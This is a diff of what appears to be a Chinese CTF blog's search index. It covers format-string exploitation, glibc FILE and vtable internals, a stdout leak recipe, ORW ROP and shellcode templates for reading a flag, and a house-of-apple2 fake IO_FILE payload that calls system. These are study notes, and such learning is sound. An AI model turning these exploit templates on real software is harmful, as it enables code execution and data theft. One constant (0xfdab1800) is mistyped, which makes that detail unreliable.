@@ -13,10 +13,7 @@
 2、在使用%n时会进行一些检查。
 </code></pre>
 <p>这时如果程序加了字数限制，漏洞利用就会变得很麻烦。<br>所以这里采用  %a  来进行泄露，但是不同的 是%a是泄露数据，并且是泄露上方的数据与其他格式化字符串截然相反的泄露方向。</p>
-<br>
-<br>
-
-
+<p>6、*<br>eg：%*7$c+%6$hnn<br>上面这个例子的作用就是将栈上第7个的位置的值直接输入到6p这个位置。<br>通常用于read字节较少的情况。<br><br><br><br></p>
 <h2 id="栈上格式化字符串（原理）"><a href="#栈上格式化字符串（原理）" class="headerlink" title="栈上格式化字符串（原理）"></a>栈上格式化字符串（原理）</h2><h3 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h3><p>1、由于在32位程序中，系统并不是采用的寄存器传参，所以关于printf的所有参数都会显示在栈上。<br>如同<br><img src="/images/format_stack.png" alt="图片"><br>其中依次存储的数据是prinf的内容、参数1、参数2、printf的返回地址。<br>如果我们用printf来打印其中的地址：</p>
 <pre><code>printf(&quot;%p,%p&quot;,&quot;test&quot;,&amp;a);
 </code></pre>
@@ -139,8 +136,7 @@ inter()
     <title>IO</title>
     <url>/2024/07/18/IO/</url>
     <content><![CDATA[<hr>
-<h1 id="IO结构体"><a href="#IO结构体" class="headerlink" title="IO结构体"></a><strong>IO结构体</strong></h1> <span id="more"></span>                                                                                 
-<p>关于IO_file_jumps中函数的具体作用可以参考以下两个博客<br><a href="https://bbs.kanxue.com/thread-275968.htm#msg_header_h1_3">国资</a>和<a href="https://ray-cp.github.io/">ray-cp</a> 或者星盟的也可以      </p>
+<h1 id="IO结构体"><a href="#IO结构体" class="headerlink" title="IO结构体"></a><strong>IO结构体</strong></h1><p>关于IO_file_jumps中函数的具体作用可以参考以下两个博客<br><a href="https://bbs.kanxue.com/thread-275968.htm#msg_header_h1_3">国资</a>和<a href="https://ray-cp.github.io/">ray-cp</a> 或者星盟的也可以      </p>
 <br>
 <br>
 
@@ -307,7 +303,14 @@ __imbue = 0x7ffff7c96f90 &lt;_IO_default_imbue&gt;
 </code></pre>
   <br>
 
-<h3 id="glibc2-24增加的vtable-check"><a href="#glibc2-24增加的vtable-check" class="headerlink" title="glibc2.24增加的vtable_check"></a>glibc2.24增加的vtable_check</h3><pre><code>void _IO_vtable_check (void) attribute_hidden;
+<h3 id="glibc2-24增加的vtable-check"><a href="#glibc2-24增加的vtable-check" class="headerlink" title="glibc2.24增加的vtable_check"></a>glibc2.24增加的vtable_check</h3><pre><code>2.23 的没有任何限制，可以将vtable 劫持在堆上并修改其内容，然后触发FSOP.   
+
+2.24 引入了vtable check，使得将vtable 整体劫持到堆上已不可能，大佬发现可以使用内部的vtable中_IO_str_jumps或_IO_wstr_jumps来进行利用。   
+
+2.31 中将_IO_str_finish函数中强制执行free函数，导致无法使用上述问题，因而催生出其他调用链。
+
+
+void _IO_vtable_check (void) attribute_hidden;
 static inline const struct _IO_jump_t *
 IO_validate_vtable (const struct _IO_jump_t *vtable)
 &#123;
@@ -317,8 +320,29 @@ uintptr_t offset = ptr -(uintptr_t)__start___libc_IO_vtables;
 if (__glibc_unlikely (offset &gt;= section_length))
     _IO_vtable_check ();
 return vtable;
-&#125;    
+&#125;     
 </code></pre>
+<h4 id="虚表范围-glibc2-37之前"><a href="#虚表范围-glibc2-37之前" class="headerlink" title="虚表范围-glibc2.37之前"></a>虚表范围-glibc2.37之前</h4><p>虚表位置判断主要在IO_validate_vtable函数，2.37以前判断区间为_IO_helper_jumps - _IO_str_jumps之间的区域 0xd60，里面有以下虚表。</p>
+<pre><code>_IO_helper_jumps
+_IO_helper_jumps
+_IO_cookie_jumps
+_IO_proc_jumps
+_IO_str_chk_jumps
+_IO_wstrn_jumps
+_IO_wstr_jumps
+_IO_wfile_jumps_maybe_mmap
+_IO_wfile_jumps_mmap
+__GI__IO_wfile_jumps
+_IO_wmem_jumps
+_IO_mem_jumps
+_IO_strn_jumps
+_IO_obstack_jumps
+_IO_file_jumps_maybe_mmap
+_IO_file_jumps_mmap
+__GI__IO_file_jumps
+_IO_str_jumps
+</code></pre>
+<p>之后居然还有虚表check绕过<br>详情：<br><a href="https://bbs.kanxue.com/thread-275968.htm#msg_header_h1_3">https://bbs.kanxue.com/thread-275968.htm#msg_header_h1_3</a></p>
 <br> 
     几个常用的函数：  
   
@@ -354,6 +378,137 @@ return vtable;
         <tag>pwn</tag>
         <tag>IO</tag>
         <tag>ctf</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>_IO_2_1_stdout_</title>
+    <url>/2024/07/19/IO_2_1_stdout/</url>
+    <content><![CDATA[<hr>
+<h1 id="IO-2-1-stdout-的利用（速成）"><a href="#IO-2-1-stdout-的利用（速成）" class="headerlink" title="_IO_2_1_stdout_的利用（速成）"></a>_IO_2_1_stdout_的利用（速成）</h1><p>详情可看：<br><a href="https://blog.csdn.net/qq_41202237/article/details/113845320">hollk</a> </p>
+<p><a href="https://bbs.kanxue.com/thread-275968.htm#msg_header_h1_2">国资</a></p>
+<h3 id="IO-FILE-plus结构体"><a href="#IO-FILE-plus结构体" class="headerlink" title="_IO_FILE_plus结构体"></a>_IO_FILE_plus结构体</h3><pre><code>struct _IO_FILE_plus &#123;
+    FILE file;
+    const struct _IO_jump_t *vtable;
+&#125;
+</code></pre>
+<p>其中32 位的file到 vtable 偏移为 0x94，64 位偏移为 0xd8</p>
+<br>
+
+<h3 id="IO-2-1-stdout-结构体"><a href="#IO-2-1-stdout-结构体" class="headerlink" title="_IO_2_1_stdout_结构体"></a>_IO_2_1_stdout_结构体</h3><p><img src="/images/stdout.png" alt="图片">   </p>
+<p>关于利用stdout来泄露libc主要设置以下结构的值：   </p>
+<pre><code>1、flag为0xfbad18xx，一般为0xfdab1800
+
+2、更改_IO_read_ptr、_IO_read_end、_IO_read_base指针的值为0.
+
+3、_IO_write_base改为需要泄露的地址，_IO_write_ptr改为泄露地址的终止值。
+</code></pre>
+<p>改完了这些，就可以通过调用printf或者puts函数来打印出地址了。</p>
+<hr>
+]]></content>
+      <tags>
+        <tag>pwn</tag>
+        <tag>IO</tag>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>orw模板</title>
+    <url>/2024/08/10/orw%E6%A8%A1%E6%9D%BF/</url>
+    <content><![CDATA[<h1 id="orw-模板"><a href="#orw-模板" class="headerlink" title="orw 模板"></a>orw 模板</h1><h3 id="tips"><a href="#tips" class="headerlink" title="tips"></a><em>tips</em></h3><p>liunx64：<br>1、read 0、readv 19<br>2、write 1、writev 20<br>3、open 2、openat 257<br>4、sendfile 40    </p>
+<br>
+ 
+<h2 id="orw的原型及参数"><a href="#orw的原型及参数" class="headerlink" title="orw的原型及参数"></a>orw的原型及参数</h2><pre><code>1. read
+原型: ssize_t read(int fd, void *buf, size_t count);
+参数:
+fd：文件描述符。
+buf：指向存储读取数据的缓冲区的指针。
+count：要读取的字节数。      
+
+2. readv
+原型: ssize_t readv(int fd, const struct iovec *iov, int iovcnt);
+参数:
+fd：文件描述符。
+iov：指向 iovec 结构体数组的指针，每个 iovec 结构体包含一个缓冲区及其大小。
+iovcnt：iovec 结构体的数量。  
+
+3. write
+原型: ssize_t write(int fd, const void *buf, size_t count);
+参数:
+fd：文件描述符。
+buf：指向要写入的数据的缓冲区的指针。
+count：要写入的字节数。
+
+4. writev
+原型: ssize_t writev(int fd, const struct iovec *iov, int iovcnt);
+参数:
+fd：文件描述符。
+iov：指向 iovec 结构体数组的指针，每个 iovec 结构体包含一个缓冲区及其大小。
+iovcnt：iovec 结构体的数量。
+
+5. open
+原型: int open(const char *pathname, int flags, mode_t mode);
+参数:
+pathname：要打开的文件的路径。
+flags：打开文件的标志，如 O_RDONLY、O_WRONLY、O_RDWR。
+mode：文件权限，仅在使用 O_CREAT 标志时需要。
+
+6. openat
+原型: int openat(int dirfd, const char *pathname, int flags, mode_t mode);
+参数:
+dirfd：目录文件描述符，表示相对路径的基准目录（可以是 AT_FDCWD）。
+pathname：要打开的文件的路径。
+flags：打开文件的标志，如 O_RDONLY、O_WRONLY、O_RDWR。
+mode：文件权限，仅在使用 O_CREAT 标志时需要。
+
+7. sendfile
+原型: ssize_t sendfile(int out_fd, int in_fd, off_t *offset, size_t count);
+参数:
+out_fd：目标文件描述符（通常是套接字）。
+in_fd：源文件描述符。
+offset：偏移量的指针，用于指定从源文件中开始的字节位置（如果为 NULL，从当前文件位置开始）。
+count：要发送的字节数。
+</code></pre>
+<h3 id="模版"><a href="#模版" class="headerlink" title="模版"></a><em>模版</em></h3><p>只禁用了execve   </p>
+<pre><code>o=base+libc.sym[&#39;open&#39;]
+r=base+libc.sym[&#39;read&#39;]
+w=base+libc.sym[&#39;write&#39;]
+orw=p64(rdi)+p64(flag)+p64(rsi)+p64(0)+p64(o)
+orw+=p64(rdi)+p64(3)+p64(rsi)+p64(flag)+p64(rdx_r)+p64(0x30)+p64(0)+p64(r)
+orw+=p64(rdi)+p64(1)+p64(rsi)+p64(flag)+p64(rdx_r)+p64(0x30)+p64(0)+p64(w)
+</code></pre>
+<p>其中的寄存器的呈现形式及赋值视情况而变动。</p>
+ <br>
+ 禁用open、execve、read、write、readv、writev
+
+<pre><code>asm(&#39;&#39;&#39;
+mov rdi,3;                    #openat调用
+mov rdx,0;
+mov r10,0;
+mov rsi,flag;                 #flag地址
+mov rax,257;
+syscall;
+
+mov rdi,0;                    #sendfile调用  
+mov rsi,3;
+mov rdi,1;
+xor rdx,rdx;
+mov r10,0x33;                 #读取大小
+mov rax,40;
+syscall;
+
+
+mov rax,60;                    #exit调用
+xor rdi,rdi;
+syscall;
+&#39;&#39;&#39;
+)
+</code></pre>
+<p>其中指令的表现形式也视具体情况而变动。</p>
+]]></content>
+      <tags>
+        <tag>pwn</tag>
+        <tag>ctf</tag>
+        <tag>orw</tag>
       </tags>
   </entry>
   <entry>
@@ -421,7 +576,7 @@ getshell
 </code></pre>
 <br>
  
-<h2 id="house-of-apple2"><a href="#house-of-apple2" class="headerlink" title="house of apple2"></a>house of apple2</h2><p>具体原理请看:<a href="https://bbs.kanxue.com/thread-273832.htm">https://bbs.kanxue.com/thread-273832.htm</a>       </p>
+<h2 id="house-of-apple2"><a href="#house-of-apple2" class="headerlink" title="house of apple2"></a>house of apple2</h2><p>个人感觉这个house of apple与house of cat不同必须要泄露heap地址，毕竟apple需要两个伪造的地址来控制eip，除非你知道栈地址。<br>具体原理请看:<a href="https://bbs.kanxue.com/thread-273832.htm">https://bbs.kanxue.com/thread-273832.htm</a>       </p>
 <br>
 <em>适用版本</em>    
 glibc:2.34-         
@@ -464,14 +619,17 @@ _wide_data-&gt;_wide_vtable-&gt;doallocate设置为地址C用于劫持RIP，即�
 </code></pre>
 <br>
     模板（getshell）
-<em>需要将伪造chunk的pre_size位伪造成  '  sh;'  或者  ';sh\x00'  </em>
-    fake_io_file = p64(0)*2 + p64(1) + p64(2)
-    fake_io_file = fake_io_file.ljust(0xa0 - 0x10, b'\0') + p64(chunk_addr+0x100) # _wide_data
-    fake_io_file = fake_io_file.ljust(0xc0 - 0x10, b'\0') + p64(0xffffffffffffffff) # _mode
-    fake_io_file = fake_io_file.ljust(0xd8 - 0x10, b'\0') + p64(io_wfile_jumps) # vtable
-    fake_io_file = fake_io_file.ljust(0x100 - 0x10 + 0xe0, b'\0') + p64(chunk_addr+0x200)
-    fake_io_file = fake_io_file.ljust(0x200-0x10,b'\0')+p64(0)*13+ p64(sys)
+<em>需要将伪造chunk的pre_size位伪造成  '  sh;'  或者  ';sh\x00'  </em>    
 
+
+<pre><code>    fake_io_file = p64(0)*2 + p64(1) + p64(2)
+    fake_io_file = fake_io_file.ljust(0xa0 - 0x10, b&#39;\0&#39;) + p64(chunk_addr+0x100) # _wide_data
+    fake_io_file = fake_io_file.ljust(0xc0 - 0x10, b&#39;\0&#39;) + p64(0xffffffffffffffff) # _mode
+    fake_io_file = fake_io_file.ljust(0xd8 - 0x10, b&#39;\0&#39;) + p64(io_wfile_jumps) # vtable
+    fake_io_file = fake_io_file.ljust(0x100 - 0x10 + 0xe0, b&#39;\0&#39;) + p64(chunk_addr+0x200)
+    fake_io_file = fake_io_file.ljust(0x200-0x10,b&#39;\0&#39;)+p64(0)*13+ p64(sys)
+    
+</code></pre>
 <br>
 <br>
 
@@ -525,44 +683,13 @@ _wide_data-&gt;_wide_vtable-&gt;overflow设置为地址C用于劫持RIP，即满
 </code></pre>
 <br>
 <br>
-***]]></content>
-      <tags>
-        <tag>pwn</tag>
-        <tag>IO</tag>
-        <tag>house of</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>_IO_2_1_stdout_</title>
-    <url>/2024/07/19/IO_2_1_stdout/</url>
-    <content><![CDATA[<hr>
-<h1 id="IO-2-1-stdout-的利用（速成）"><a href="#IO-2-1-stdout-的利用（速成）" class="headerlink" title="_IO_2_1_stdout_的利用（速成）"></a>_IO_2_1_stdout_的利用（速成）</h1><span id="more"></span>
 
-<p>详情可看：<br><a href="https://blog.csdn.net/qq_41202237/article/details/113845320">hollk</a> </p>
-<p><a href="https://bbs.kanxue.com/thread-275968.htm#msg_header_h1_2">国资</a></p>
-<h3 id="IO-FILE-plus结构体"><a href="#IO-FILE-plus结构体" class="headerlink" title="_IO_FILE_plus结构体"></a>_IO_FILE_plus结构体</h3><pre><code>struct _IO_FILE_plus &#123;
-    FILE file;
-    const struct _IO_jump_t *vtable;
-&#125;
-</code></pre>
-<p>其中32 位的file到 vtable 偏移为 0x94，64 位偏移为 0xd8</p>
-<br>
-
-<h3 id="IO-2-1-stdout-结构体"><a href="#IO-2-1-stdout-结构体" class="headerlink" title="_IO_2_1_stdout_结构体"></a>_IO_2_1_stdout_结构体</h3><p><img src="/images/stdout.png" alt="图片">   </p>
-<p>关于利用stdout来泄露libc主要设置以下结构的值：   </p>
-<pre><code>1、flag为0xfbad18xx，一般为0xfbad0000
-
-2、更改_IO_read_ptr、_IO_read_end、_IO_read_base指针的值为0.
-
-3、_IO_write_base改为需要泄露的地址，_IO_write_ptr改为泄露地址的终止值。
-</code></pre>
-<p>改完了这些，就可以通过调用printf或者puts函数来打印出地址了。</p>
 <hr>
 ]]></content>
       <tags>
         <tag>pwn</tag>
         <tag>IO</tag>
-        <tag>CTF</tag>
+        <tag>house of</tag>
       </tags>
   </entry>
   <entry>
@@ -571,7 +698,7 @@ _wide_data-&gt;_wide_vtable-&gt;overflow设置为地址C用于劫持RIP，即满
     <content><![CDATA[<hr>
 <h1 id="堆中bin的利用"><a href="#堆中bin的利用" class="headerlink" title="堆中bin的利用"></a>堆中bin的利用</h1><span id="more"></span>
 
-<p><em>tips:</em><br>1、fastbin、tachebin遵循先进后出<br>2、unsortedbin、largebin、smallbin遵循先进先出<br>3、unsortedbin attack于glibc2.27时添加了保护<br>4、unsortedbin attack于glibc2.29被彻底扼杀<br>5、在glibc2.27及以上中因为添加了tachebin，所以低于0x420的chunk不会进unsortedbin。<br>6、在glibc2.27以下的大于0x80进unsortedbin，大于0x3f0进largebin。<br>7、largebin的公差为0x40          </p>
+<p><em>tips:</em><br>1、fastbin、tachebin遵循先进后出<br>2、unsortedbin、largebin、smallbin遵循先进先出<br>3、unsortedbin attack于glibc2.27时添加了保护<br>4、unsortedbin attack于glibc2.29被彻底扼杀<br>5、在glibc2.27及以上中因为添加了tachebin，所以低于0x420的chunk不会进unsortedbin。<br>6、在glibc2.27以下的大于0x80进unsortedbin，大于0x3f0进largebin。<br>7、largebin的公差为0x40<br>8、tachebin于glibc2.28之前并不会检查double free  </p>
 <h2 id="Fastbin-attack"><a href="#Fastbin-attack" class="headerlink" title="Fastbin attack"></a>Fastbin attack</h2><p>个人觉得fastbin attack总结起来其实利用就只有两个，double free、地址任意分配。   </p>
 <p>1、首先fastbin是由什么来进行管理的呢？<br>答案是fastbinY数组进行管理，这个数组是main_arena的一个成员变量，数组的最大下标是7.<br>由fastbin所管理的chunk，根据其chunk的大小的不同从而进入不同的fastbinY中，大小顺序是从0x20-0x80，依次对应不用的数组下标。    </p>
 <p>1、在fastbin中，它的prev_in_use位总是为1的。</p>
